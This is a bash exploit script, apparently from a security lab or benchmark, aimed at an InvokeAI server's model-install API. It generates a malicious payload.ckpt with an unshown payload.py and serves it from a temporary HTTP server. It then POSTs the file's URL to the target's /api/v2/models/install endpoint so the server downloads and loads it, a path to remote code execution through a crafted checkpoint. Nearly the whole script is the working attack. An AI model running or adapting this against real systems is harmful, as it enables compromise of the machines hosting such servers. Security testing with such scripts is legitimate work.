#!/bin/bash
set -euo pipefail

cleanup() {
  kill "${SERVER_PID:-}" 2>/dev/null || true
  rm -f "$PAYLOAD_FILE"
}
trap cleanup EXIT

# Create the payload.ckpt file
PAYLOAD_FILE="payload.ckpt"
python payload.py

# Check if the file was created successfully
if [ -f "$PAYLOAD_FILE" ]; then
    echo "Payload file created successfully."
else
    echo "Failed to create payload file."
    exit 1
fi

# Find a free port
PORT=$(python - << 'EOF'
import socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('', 0))
    print(s.getsockname()[1])
EOF
)

# Start the server
python -m http.server $PORT --bind 0.0.0.0 &
SERVER_PID=$!

# Check if the server started successfully
timeout=10
elapsed=0

while ! kill -0 "$SERVER_PID" 2>/dev/null; do
  if [ "$elapsed" -ge "$timeout" ]; then
    echo "HTTP server did not start within $timeout seconds."
    exit 1
  fi
  sleep 1
  elapsed=$((elapsed + 1))
done

echo "HTTP server running (PID $SERVER_PID)â€¦"

# Exploit the invokeAI server
HOSTNAME=$(hostname)
python - <<EOF
import requests
url = "http://${HOSTNAME}:${PORT}/payload.ckpt"
resp = requests.post(
    "http://invokeai:9090/api/v2/models/install",
    params={"source": url, "inplace": "true"},
    json={}
)
print("Exploit status:", resp.status_code)
print(resp.text)
EOF


# Clean up
kill $SERVER_PID
rm -f $PAYLOAD_FILE